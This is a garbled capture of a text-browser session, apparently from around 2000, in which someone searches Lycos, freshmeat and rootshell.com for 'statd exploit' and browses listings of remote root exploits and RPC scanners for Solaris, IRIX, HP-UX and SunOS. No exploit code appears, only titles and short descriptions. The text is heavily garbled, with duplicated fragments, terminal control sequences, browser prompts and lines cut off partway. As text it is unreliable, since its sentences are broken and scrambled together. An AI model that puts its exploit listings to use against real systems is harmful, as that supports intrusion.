+Vulnerability in statd exposes vulnerability in automountd Vulnerability in statd exposes vulnerability in automountd TranslateTranslateCERT Advisory CA-99-05-statd-automountd CERT Advisory CA-99-05-statd-automountd TranslateTranslateCERT Advisory CA-97.26.statd CERT Advisory CA-97.26.statd TranslateTranslateBugtraq archives for 4th quarter (Oct-Dec) 1997: Re: Solaris 2.5.1x86 statd exploit 4    http://www.insecure.org/sploits/Solaris.statd.html[Translate]2. Solaris 2.5.1 x86 statd exploit - Date Prev] [Date Next] [ThreadPrev] [Thread Next] [Date Index] [Thread Index] Solaris 2.5.1 x86statd exploit To: BUGTRAQ@NETSPACE.ORG Subject: Solaris 2.5.1 x86statd exploit From: Aleph Onehttp://www.geog.ubc.ca/snag/bugtraq/msg01103.html3. Re: Solaris 2.5.1 x86 statd exploit - Date Prev] [Date Next][Thread Prev] [Thread Next] [Date Index] [Thread Index] Re:olaris 2.5.1 x86 statd exploit To: BUGTRAQ@NETSPACE.ORG Subject:Re: Solaris 2.5.1 x86 statd exploit From: Casper Dihttp://www.geog.ubc.ca/snag/bugtraq/msg01105.html4. Solaris Statd exploit - Solaris Statd exploitSummaryDescription:Solaris 2.5.1 x86 remote overflow for statd. There isapparently an earlier patch which doesn't fix the problem.Author:Anonymous Compromise: root (remote) Vulhttp://www.bitpunk.com/arch/s/Solaris.statd.html
+
+TranslateTranslateSolaris Statd exploit Solaris Statd exploit TranslateTranslateRe: Solaris 2.5.1 x86 statd exploit Re: Solaris 2.5.1 x86 statd exploit TranslateTranslateSolaris 2.5.1 x86 statd exploit Solaris 2.5.1 x86 statd exploit Translate3 Because they are expected to run Microsoft operating systems. 101Reasons Why You Can't Find Your System Administrator -->   http://www.unixgods.org/[Translate]4. Link back to Exploit - If you would like your site included in theExploit random link database, enter the site URL in the form belowthen click 'submit'. If you do submit your site, please considerhttp://www.exploit.com/backlink.htmlWEB SITES[ POPULAR | WEB SITES ]1,055 Web sites were found in a search of the complete Lycos Webcatalog1. Solaris Statd exploit - Last modified: Saturday, 24-Apr-199921:30:09 PDT Solaris Statd exploitSummary Description:Solaris2.5.1 x86 remote overflow for statd. There is apparently anearlier patch which doesn't fix the probl
+
+Solaris Statd exploit Solaris Statd exploit POPULAR POPULAR TranslateTranslateLink back to Exploit Link back to Exploit Translate2 POPULAR[ POPULAR | WEB SITES ] 4 Web sites were selected based on user selection trafficBarnes and Noble [Keyword]statd exp GO1. DuckTank.Net - Hacking and Computer Security - Last Updated    08.20.00 - DuckTank Tips     DuckTank Files     NT Net Cmds        DefCon Slogans     Visitor Log     Sign Log   Our Mailbag     Tools     Web Security     Linux     DOS Utils       http://www.ducktank.net/[Translate]2. Webproze Dotcom Inc.http://www.hack-n-crack.com/[Translate]3. UnixGods - Q: Why do PCs have a reset button on the front? A:(NORMAL LINK)   Use right-arrow or <return> to activate.UnixGods UnixGods TranslateTranslateWebproze Dotcom Inc.Webproze Dotcom Inc.TranslateTranslateDuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 DuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 Form submit button) Use right-arrow or <return> to submit ('x' for no cache).GOGOText entry field) Enter text.  Use UP or DOWN arrows or tab to move off.{xploit__           Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characterstatd exp Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listOption list) Hit return and use arrow keys and return to select option.KeywordKeywordNORMAL LINK)   Use right-arrow or <return> to activate.Barnes and NobleBarnes and NobleWEB SITES 1 REFRESH(300 sec):http://www.lycos.com/srch/?lpv=1&loc=meta_index&query=statd+exploitLycos Network Lycos Home  |  Site Map  |  My Lycos   [s.gif][s.gif]s.gif][s.gif][r;kw=statd+exploit;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financi                     al;ord=1418100395?]                Track this Searchstatd exploit_____ Go Get It! [ ] Search these results[s_crnr.gif][USEMAP:sb1.gif][p_books.gif] Save on books at Barnes & Noble.comBarnes & Noble.comBarnes & Noble.com[p_books.gif][p_books.gif][USEMAP:sb1.gif][USEMAP:sb1.gif]Checkbox Field)   Use right-arrow or <return> to toggle.[ ] 
+
+4H[ ] Form submit button) Use right-arrow or <return> to submit ('x' for no cache).Go Get It! Go Get It! Text entry field) Enter text.  Use UP or DOWN arrows or tab to move off.statd exploit_____           Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character 
+
+4H{ exploit redh___a
+
+4Hstatd exploit redh Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).Go Get It! Submitting form...
+Getting http://www.lycos.com/srch/?loc=searchbox&ss=975006487%7C2&query=statd+
+Looking up www.lycos.com.
+Making HTTP connection to www.lycos.com.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+Read 245 bytes of data.
+HTTP/1.1 200 OKSearch for: "statd exploit redha2oc=meta_index&ss=975006487%7C2&query=statd+exploit+redhat[r;kw=statd+exploit+redhat;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financial;ord=157730485?] statd exploit redh Go Get It! [ ] Search these resultsData transfer complete8(NORMAL LINK)   Use right-arrow or <return> to activate.http://www.lycos.com/srch/?loc=meta_index&ss=975006487%7C2&query=statd+exploit+redhathttp://www.lycos.com/srch/?loc=meta_index&ss=975006487%7C2&query=statd+exploit+redhatLycos NetworkLycos NetworkLycos HomeLycos HomeSite MapSite MapMy LycosMy Lycos[r;kw=statd+exploit+redhat;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financial;ord=157730485?][r;kw=statd+exploit+redhat;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financial;ord=157730485?]Track this SearchTrack this SearchText entry field) Enter text.  Use UP or DOWN arrows or tab to move off.{xploit redhat____           Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characterstatd exploit redh Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).Go Get It! Go Get It! Checkbox Field)   Use right-arrow or <return> to toggle.[ ] [ ] NORMAL LINK)   Use right-arrow or <return> to activate.[USEMAP:sb1.gif]2 [p_books.gif] Save on books at Barnes & Noble.comPOPULAR[ POPULAR | WEB SITES ]  4 Web sites were selected based on user selection trafficBarnes and Noble Keyword]statd exp GO1. DuckTank.Net - Hacking and Computer Security - Last Updated    08.20.00 - DuckTank Tips     DuckTank Files     NT Net Cmds    DefCon Slogans     Visitor Log     Sign Log   Our Mailbag     Tools     Web Security     Linux   DOS Utils   http://www.ducktank.net/    [Translate] 2. Webproze Dotcom Inc.    http://www.hack-n-crack.com/[Translate]
+
+7H[p_books.gif][p_books.gif]Barnes & Noble.comBarnes & Noble.comWEB SITES WEB SITES Barnes and NobleBarnes and NobleOption list) Hit return and use arrow keys and return to select option.KeywordKeywordText entry field) Enter text.  Use UP or DOWN arrows or tab to move off.{redhat__           Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characterstatd exp Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).GOGONORMAL LINK)   Use right-arrow or <return> to activate.DuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 DuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 TranslateTranslateWebproze Dotcom Inc.Webproze Dotcom Inc.TranslateTranslateWebproze Dotcom Inc.Getting http://click.hotbot.com/director.asp?id=2&target=http://www.hack-n-cra
+Looking up click.hotbot.com.
+Making HTTP connection to click.hotbot.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 302 Object moved
+Data transfer complete
+HTTP/1.1 302 Object moved
+Using http://www.hack-n-crack.com/
+Getting http://www.hack-n-crack.com/
+Looking up www.hack-n-crack.com.
+Making HTTP connection to www.hack-n-crack.com.
+
+ection interrupted.
+Getting http://www.lycos.com/srch/?loc=searchbox&ss=975006487%7C2&query=statd+Webproze Dotcom Inc.(NORMAL LINK)   Use right-arrow or <return> to activate.Webproze Dotcom Inc.Getting http://www.lycos.com/srch/?lpv=1&loc=searchhp&query=statd+exploit       Search for: "statd exploi1 REFRESH(300 sec):http://www.lycos.com/srch/?lpv=1&loc=meta_index&query=statd+exploitLycos Network Lycos Home  |  Site Map  |  My Lycos   [s.gif][s.gif][s.gif]s.gif][r;kw=statd+exploit;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financi                     al;ord=1418100395?]                                                  Track this Searchstatd exploit redh Go Get It! [ ] Search these results[s_crnr.gif][USEMAP:sb1.gif][p_books.gif] Save on books at Barnes & Noble.com(Form submit button) Use right-arrow or <return> to submit ('x' for no cache).Go Get It! Go Get It! Checkbox Field)   Use right-arrow or <return> to toggle.[ ] [ ] NORMAL LINK)   Use right-arrow or <return> to activate.[USEMAP:sb1.gif][USEMAP:sb1.gif][p_books.gif][p_books.gif]Barnes & Noble.com2 POPULAR[ POPULAR | WEB SITES ]  4 Web sites were selected based on user selection trafficBarnes and Noble Keyword]statd exp GO1. DuckTank.Net - Hacking and Computer Security - Last Updated    08.20.00 - DuckTank Tips     DuckTank Files     NT Net Cmds    DefCon Slogans     Visitor Log     Sign Log   Our Mailbag     Tools     Web Security     Linux   DOS Utils   http://www.ducktank.net/    [Translate] 2. Webproze Dotcom Inc.    http://www.hack-n-crack.com/[Translate] 3. UnixGods - Q: Why do PCs have a reset button on the front? A:
+
+7HWEB SITES WEB SITES Barnes and NobleBarnes and NobleOption list) Hit return and use arrow keys and return to select option.KeywordKeywordText entry field) Enter text.  Use UP or DOWN arrows or tab to move off.{xploit__           Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character
+
+Hstatd exp Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).GOGONORMAL LINK)   Use right-arrow or <return> to activate.DuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 DuckTank.Net - Hacking and Computer Security - Last Updated08.20.00 TranslateTranslateWebproze Dotcom Inc.Webproze Dotcom Inc.TranslateTranslateUnixGods 3 Because they are expected to run Microsoft operating systems. 101    Reasons Why You Can't Find Your System Administrator -->    http://www.unixgods.org/[Translate]4. Link back to Exploit - If you would like your site included in theExploit random link database, enter the site URL in the form below    then click 'submit'. If you do submit your site, please consider    http://www.exploit.com/backlink.html    [Translate]WEB SITES[ POPULAR | WEB SITES ]1,055 Web sites were found in a search of the complete Lycos Webcatalog1. Solaris Statd exploit - Last modified: Saturday, 24-Apr-199921:30:09 PDT Solaris Statd exploitSummary Description:Solaris2.5.1 x86 remote overflow for statd. There is apparently an   earlier patch which doesn't fix the probl
+
+-- press space for next page --TranslateTranslateLink back to Exploit Link back to Exploit TranslateTranslatePOPULAR POPULAR Solaris Statd exploit 
+4 http://www.insecure.org/sploits/Solaris.statd.html[Translate]2. Solaris 2.5.1 x86 statd exploit - Date Prev] [Date Next] [ThreadPrev] [Thread Next] [Date Index] [Thread Index] Solaris 2.5.1 x86   statd exploit To: BUGTRAQ@NETSPACE.ORG Subject: Solaris 2.5.1 x86statd exploit From: Aleph Onehttp://www.geog.ubc.ca/snag/bugtraq/msg01103.html3. Re: Solaris 2.5.1 x86 statd exploit - Date Prev] [Date Next][Thread Prev] [Thread Next] [Date Index] [Thread Index] Re:    Solaris 2.5.1 x86 statd exploit To: BUGTRAQ@NETSPACE.ORG Subject:    Re: Solaris 2.5.1 x86 statd exploit From: Casper Dihttp://www.geog.ubc.ca/snag/bugtraq/msg01105.html  [Translate] 4. Solaris Statd exploit - Solaris Statd exploitSummaryDescription:Solaris 2.5.1 x86 remote overflow for statd. There is   apparently an 
+
+r patch which doesn't fix the problem.Author:Anonymous Compromise: root (remote) Vulhttp://www.bitpunk.com/arch/s/Solaris.statd.html[Translate]
+
+TranslateTranslateSolaris 2.5.1 x86 statd exploit Solaris 2.5.1 x86 statd exploit TranslateTranslateRe: Solaris 2.5.1 x86 statd exploit Re: Solaris 2.5.1 x86 statd exploit TranslateTranslateSolaris Statd exploit Solaris Statd exploit Translate
+
+5 5. Bugtraq archives for 4th quarter (Oct-Dec) 1997: Re: Solaris 2.5.1x86 statd exploit - Re: Solaris 2.5.1 x86 statd exploit Casper Dik   (casper@HOLLAND.SUN.COM) Tue, 25 Nov 1997 12:20:42 +0100 Messagessorted by: [ date ][ thread ][ subject ][ author ] Next message:X: "r00t advisory [ Mahttp://www.dataguard.no/bugtraq/1997_4/0376.html6. CERT Advisory CA-97.26.statd - Home | What's New | FAQ | Site   Contents | Contact Us | SEARCH About Us | Alerts | Events | FTPArchives | Improving Security | Other Resources | Reports |urvivability Research | Training and Educatihttp://www.cert.org/advisories/CA-97.26.statd.html7. CERT Advisory CA-99-05-statd-automountd - Home | What's New | FAQ   | Site Contents | Contact Us | SEARCH About Us | Alerts | Events |FTP Archives | Improving Security | Other Resources | Reports |Survivability Research | Training and Educatihttp://www.cert.org/advisories/CA-99-05-statd-automountd.html
+
+[Translate]8. Vulnerability in statd exposes vulnerability in automountd -
+
+Bugtraq archives for 4th quarter (Oct-Dec) 1997: Re: Solaris 2.5.1x86 statd exploit Bugtraq archives for 4th quarter (Oct-Dec) 1997: Re: Solaris 2.5.1x86 statd exploit TranslateTranslateCERT Advisory CA-97.26.statd CERT Advisory CA-97.26.statd TranslateURL to open: w
+
+mLooking up www.freshmeat.net first.
+Getting http://www.freshmeat.net/
+Looking up www.freshmeat.net.
+Making HTTP connection to www.freshmeat.net.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 302 Found
+Data transfer complete
+HTTP/1.1 302 Found
+Using http://freshmeat.net/
+Getting http://freshmeat.net/
+Looking up freshmeat.net.
+Making HTTP connection to freshmeat.net.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK[fm] welcome to freshmeat.net (p1 of 2LINUX.COM  SLASHDOT  SOURCEFORGE  THINKGEEK   THEMES.ORGMy OSDN  PARTNERS  AFFILIATES                    [index.php3,975006668]         Click here for a FREE Freshmeat Newsletter! freshmeat.net find: _______________news |appindex |editorials | lounge |contact |contribute | FAQ |about |scoop's page | sort by: [ date | name | urgency ]zmakebas 1.1Read 8 KB of data, 8 KB/sec.11 KB of data, 8 KB/sec.245692125893123568941368[fm] welcome to freshmeat.net (p1 of 2395023569637715981
+Data transfer complete38(NORMAL LINK)   Use right-arrow or <return> to activate.LINUX.COM LINUX.COM SLASHDOT SLASHDOT SOURCEFORGE SOURCEFORGE THINKGEEK  THINKGEEK  THEMES.ORGTHEMES.ORGMy OSDN My OSDN PARTNERS PARTNERS AFFILIATESAFFILIATESClick here for a FREE Freshmeat Newsletter!Click here for a FREE Freshmeat Newsletter!freshmeat.netfreshmeat.netForm field) Enter text.  Use <return> to submit (^Vx for no cache)._______________          Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character_______________Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listNORMAL LINK)   Use right-arrow or <return> to activate.newsnewsappindex
+
+HappindexeditorialseditorialsloungeloungecontactcontactcontributecontributeFAQFAQaboutaboutscoop's pagescoop's pagedatedatenamenameurgencyurgencyzmakebas 1.12 by Russell Marks on November 23rd 2000, 12:10 ESTzmakebas converts text files containing Sinclair Spectrum Basicprograms into tokenised Basic saved in .TAP format, ready to run on anemulator or the real thing. It also optionally provides labels as analternative to line numbers.Changes: Initial freshmeat announcement. License: Public Domain Category: Development/Tools download homepage appindex record   _________________________________________________________________Globus Toolkit 1.1.3by imipak on November 23rd 2000, 12:08 ESTGlobus is a project to provide robust, secure, peer-to-peerdistributed computing on supercomputers, clusters, and otherhigh-performance systems. It differs from other such network toolkitsin that it is tuned to the needs of high-end machines.
+
+-- press space for next page --Development/Tools 1 LINUX.COM  SLASHDOT  SOURCEFORGE  THINKGEEK   THEMES.ORGMy OSDN  PARTNERS  AFFILIATES                        [index.php3,975006668]Click here for a FREE Freshmeat Newsletter! freshmeat.net find: _______________news |appindex |editorials | lounge |contact |contribute | FAQ |about |scoop's page | sort by: [ date | name | urgency ]zmakebas 1.1(NORMAL LINK)   Use right-arrow or <return> to activate.zmakebas 1.1zmakebas 1.1urgencyurgencynamenamedatedatescoop's pagescoop's pageaboutaboutFAQFAQcontributecontributecontactcontactloungeloungeeditorialseditorialsappindexappindexnewsnewsForm field) Enter text.  Use <return> to submit (^Vx for no cache)._______________          Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character_______________Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listNORMAL LINK)   Use right-arrow or <return> to activate.freshmeat.netfreshmeat.netClick here for a FREE Freshmeat Newsletter!Click here for a FREE Freshmeat Newsletter!freshmeat.netfreshmeat.netForm field) Enter text.  Use <return> to submit (^Vx for no cache)._______________          Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characters
+
+2;1HSubmitting form...
+Getting http://freshmeat.net/search/?q=statdx
+Looking up freshmeat.net.
+Making HTTP connection to freshmeat.net.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+Read 1 KB of data, 1 KB/sec.
+HTTP/1.1 200 OK                   [fm] search (p1 of 3     [,975006687]_______________searchTry query on: SourceForge  Google  Deja.comQuery: ____________________Data transfer complete[fm] search (p1 of 12       Query: statdx______________Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list(NORMAL LINK)   Use right-arrow or <return> to activate.LINUX.COM LINUX.COM SLASHDOT SLASHDOT SOURCEFORGE SOURCEFORGE THINKGEEK  THINKGEEK  THEMES.ORGTHEMES.ORGMy OSDN My OSDN PARTNERS PARTNERS AFFILIATESAFFILIATESClick here for a FREE Freshmeat Newsletter!Click here for a FREE Freshmeat Newsletter!freshmeat.netfreshmeat.netForm field) Enter text.  Use <return> to submit (^Vx for no cache)._______________          Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character_______________Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listNORMAL LINK)   Use right-arrow or <return> to activate.newsnewsappindex
+
+Happindexeditorialseditorialsloungeloungecontact
+
+HcontactcontributecontributeFAQFAQaboutaboutscoop's pagescoop's pageSourceForge SourceForge 
+
+  Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.     H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list   (NORMAL LINK)   Use right-arrow or <return> to activate.                        Google Google Deja.comDeja.comText entry field) Enter text.  Use UP or DOWN arrows or tab to move off.statdx______________          Enter text into the field by typing on the keyboard                Ctrl-U to delete all text in field, [Backspace] to delete a character                                                            [fm] search (p2 of 12)      Logical OR: [ ]                                                            Category:[ ] Console - Administration[ ] Console - Anti-Spam[ ] Console - Backup[ ] Console - CAE[ ] Console - CD Writing Software[ ] Console - Communication[ ] Console - Compression Utilities[ ] Console - Documentation[ ] Console - Drivers[ ] Console - Editors[ ] Console - Education[ ] Console - eMail[ ] Console - Embedded[ ] Console - Emulators[ ] Console - Encryption[ ] Console - File Managers[ ] Console - Filesystems[ ] Console - Financial  Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.
+
+ H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list(Checkbox Field)   Use right-arrow or <return> to toggle.[ ][ ][ ] 
+
+[ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] 
+
+[ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ]URL to open: w
+
+7mLooking up www.rootshell.org first.
+Getting http://www.rootshell.org/
+Looking up www.rootshell.org.
+Making HTTP connection to www.rootshell.org.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+Read 358 bytes of data.
+HTTP/1.1 200 OK
+Data transfer complete
+REFRESH(0 sec): http://rootshell.com/beta/news.html
+
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.http://rootshell.com/beta/news.htmlGetting http://rootshell.com/beta/news.html
+Looking up rootshell.com.
+Making HTTP connection to rootshell.com.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+Read 500 bytes of data.
+HTTP/1.1 200 OKWelcome to Rootshell | Hosted by connectnet.com (p1 of 2)  [logo.gif] Please visit our sponsors. Exploits News Search Documentation _______________Do you have security related news? Please e-mail it tonews@rootshell.com.Microsoft Windows Media Encoder Vulnerable to Attack5/31/2000 6:52AM PSTRootshell has discovered a vulnerability in the Windows Media Encoder4.0 and 4.1 which allows a remote user to crash the encoder byData transfer completeWelcome to Rootshell | Hosted by connectnet.com (p1 of 21(NORMAL LINK)   Use right-arrow or <return> to activate.[logo.gif][logo.gif]Please visit our sponsors.Please visit our sponsors.ExploitsExploitsNewsNewsSearchSearchDocumentationDocumentationForm field) Enter text.  Use <return> to submit, arrows or tab to move off._______________          Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character_______________Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listNORMAL LINK)   Use right-arrow or <return> to activate.news@rootshell.com2 connecting to the MSBD service. A bogus packets causes the encoder toattempt to allocate more memory than the computer has resulting in acrash.rootshell.com - sample exploitmicrosoft.com - Official patch.2600 WEBSITE HIT WITH INJUNCTION1/21/2000 11:13AM PST"At 5:40 pm on Thursday, the Motion Picture Association of America wasgranted a preliminary injunction against us - and everyone we've everhad any contact with - prohibiting the distribution of the DeCSSsource code.".  2600.com - news article  wired.com - DVD Hackers Take a Hit in NY  news.com - Film industry fights DVD decryption sites 
+
+-- press space for next page --rootshell.com - sample exploitrootshell.com - sample exploitmicrosoft.com - Official patch.microsoft.com - Official patch.2600.com - news article2600.com - news articlewired.com - DVD Hackers Take a Hit in NYwired.com - DVD Hackers Take a Hit in NYnews.com - Film industry fights DVD decryption sites3   slashdot.org - Injunction Against 2600 for DeCSSIntel releases fix for E-mail Station1/10/2000 10:00PM PSTFrom the Intel website: "During the product development process, Intelincorporated the ability for remote access for circumstances wherecustomers needed remote help to solve product issues. This capabilityhas raised some security concerns from our customers, so Intel hasposted a free download to current customers of the Intel. InBusinesseMail Station which will "close the door" disabling any unauthorizedaccess of the product."Rootshell now available to Palm & WindowsCE users via AvantGo1/9/2000 8:33PM PSTOn the road, with a client, or lounging on the couch, Rootshell is nowavailable to Palm & WindowsCE compatbile devices via a new AvantGo webchannel.avantgo.com - download softwareavantgo.com - add the Rootshell channel.Microsoft Hotmail open to Javascript Attack Again
+
+slashdot.org - Injunction Against 2600 for DeCSSslashdot.org - Injunction Against 2600 for DeCSSavantgo.com - download softwareavantgo.com - download softwareavantgo.com - add the Rootshell channel.avantgo.com - add the Rootshell channel.avantgo.com - download softwareavantgo.com - download softwareslashdot.org - Injunction Against 2600 for DeCSS2 connecting to the MSBD service. A bogus packets causes the encoder toattempt to allocate more memory than the computer has resulting in acrash.  rootshell.com - sample exploit  microsoft.com - Official patch.2600 WEBSITE HIT WITH INJUNCTION1/21/2000 11:13AM PST"At 5:40 pm on Thursday, the Motion Picture Association of America wasgranted a preliminary injunction against us - and everyone we've everhad any contact with - prohibiting the distribution of the DeCSSsource code.".  2600.com - news articlewired.com - DVD Hackers Take a Hit in NYnews.com - Film industry fights DVD decryption sites 
+
+news.com - Film industry fights DVD decryption sitesnews.com - Film industry fights DVD decryption siteswired.com - DVD Hackers Take a Hit in NYwired.com - DVD Hackers Take a Hit in NY2600.com - news article2600.com - news articlemicrosoft.com - Official patch.microsoft.com - Official patch.rootshell.com - sample exploit1   [logo.gif]                    Please visit our sponsors.    Exploits          News        Search Documentation                            _______________Do you have security related news? Please e-mail it tonews@rootshell.com.Microsoft Windows Media Encoder Vulnerable to Attack5/31/2000 6:52AM PSTRootshell has discovered a vulnerability in the Windows Media Encoder4.0 and 4.1 which allows a remote user to crash the encoder by
+
+H(NORMAL LINK)   Use right-arrow or <return> to activate.news@rootshell.comnews@rootshell.comForm field) Enter text.  Use <return> to submit, arrows or tab to move off._______________          Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character_______________Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listNORMAL LINK)   Use right-arrow or <return> to activate.DocumentationDocumentationSearchSearchNewsNewsExploitsGetting http://rootshell.com/beta/exploits.html
+Looking up rootshell.com.
+Making HTTP connection to rootshell.com.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+Read 500 bytes of data.
+HTTP/1.1 200 OK Welcome to Rootshell | Hosted by connectnet.com (p1 of 2  [nerdgear-banner2.gif] ExploitsBrowse 2000: June May Apr Mar Feb JanBrowse 1999: Jun  May Apr Mar Feb JanBrowse 1998: Dec  Nov Oct Sep Aug Jul Jun May Apr Mar Feb JanBrowse 1997: Dec  Nov Oct Sep Aug JulyAll exploits are organized by publish date. If you are looking forinformation about a specific program or operating system please useData transfer complete(NORMAL LINK)   Use right-arrow or <return> to activate.[logo.gif][logo.gif][nerdgear-banner2.gif][nerdgear-banner2.gif]ExploitsExploitsNewsNewsSearchSearchDocumentationDocumentationForm field) Enter text.  Use <return> to submit, arrows or tab to move off._______________          Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character_______________Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listNORMAL LINK)   Use right-arrow or <return> to activate.June June Form field) Enter text.  Use <return> to submit, arrows or tab to move off._______________          Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characterr
+
+1HSubmitting form...
+Getting http://rootshell.com/search.fcg
+Looking up rootshell.com.
+Making HTTP connection to rootshell.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK
+
+_______________Connect from 00-20-78-13-a3-51.bconnected.net [209.53.2.233](Lynx/2.8.3dev.18 libwww-FM/2.14)logged.Rootshell search results2/10/99 pmap_tools.tgz Certain version of rpcbind permit a remoteattacker to insert and delete entries without superuser status byspoofing a source address.10/3/98 mountdscan.c rpc.mountd scanner that looks for servers open tothe Linux rpc.mountd hole.Read 5 KB of data, 5 KB/sec.
+Data transfer complete3Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list(NORMAL LINK)   Use right-arrow or <return> to activate.[logo.gif][logo.gif]ExploitsExploitsNewsNewsSearchSearchDocumentation
+
+DocumentationForm field) Enter text.  Use <return> to submit, arrows or tab to move off._______________          Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character_______________Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listNORMAL LINK)   Use right-arrow or <return> to activate.pmap_tools.tgz pmap_tools.tgz mountdscan.c 2 10/5/98 rpc.ttdbserver.c rpc.ttdbserver remote overflow for Solaris,IRIX and HP-UX.7/9/98 smrex.c Buffer Overflow for Sunos 4.1 sendmail - execs/usr/etc/rpc.rexd. (See Phrack 53)7/9/98 drpcscan.tgz Scans ranges of IPs for known RPC services.1/6/98 statd-scan.c A program which scans hosts for the RPC servicestatd.9/7/97 rpc.mountd_bug.txt One can see what files a machine contains bylooking at rpc.mountd responses.7/17/97 securelib.tar.Z Shared library for SunOS 4.1 and later thatwill help protect your RPC daemons.6/11/97 rpcbind_1.1.tgz This is an rpcbind replacement that includestcp wrapper style access control.6/6/97 h_rpcinfo.tar.gz Allows you to sneak past port filters on port111 and get dumps of RPC services.4/5/97 rpcs.01b.tar.gz This is program that is designed to scansubnets for rpc services.2/14/96 rpc_chk.sh Script to get a list of running hosts from a DNSnameserver for a given domain.2/13/96 mnt.tar.gz Exploits a bug in HP-UX 9 rpc.mountd program and
+
+-- press space for next page --rpc.ttdbserver.c rpc.ttdbserver.c smrex.c smrex.c drpcscan.tgz drpcscan.tgz statd-scan.c statd-scan.c drpcscan.tgz drpcscan.tgz smrex.c smrex.c rpc.ttdbserver.c 1   [logo.gif]      Exploits          News        Search Documentation                            _______________Connect from 00-20-78-13-a3-51.bconnected.net [209.53.2.233](Lynx/2.8.3dev.18 libwww-FM/2.14)logged.Rootshell search results2/10/99 pmap_tools.tgz Certain version of rpcbind permit a remoteattacker to insert and delete entries without superuser status byspoofing a source address.10/3/98 mountdscan.c rpc.mountd scanner that looks for servers open tothe Linux rpc.mountd hole.(NORMAL LINK)   Use right-arrow or <return> to activate.mountdscan.c 2 10/5/98 rpc.ttdbserver.c rpc.ttdbserver remote overflow for Solaris,IRIX and HP-UX.7/9/98 smrex.c Buffer Overflow for Sunos 4.1 sendmail - execs/usr/etc/rpc.rexd. (See Phrack 53)7/9/98 drpcscan.tgz Scans ranges of IPs for known RPC services.1/6/98 statd-scan.c A program which scans hosts for the RPC servicestatd.9/7/97 rpc.mountd_bug.txt One can see what files a machine contains bylooking at rpc.mountd responses.7/17/97 securelib.tar.Z Shared library for SunOS 4.1 and later thatwill help protect your RPC daemons.6/11/97 rpcbind_1.1.tgz This is an rpcbind replacement that 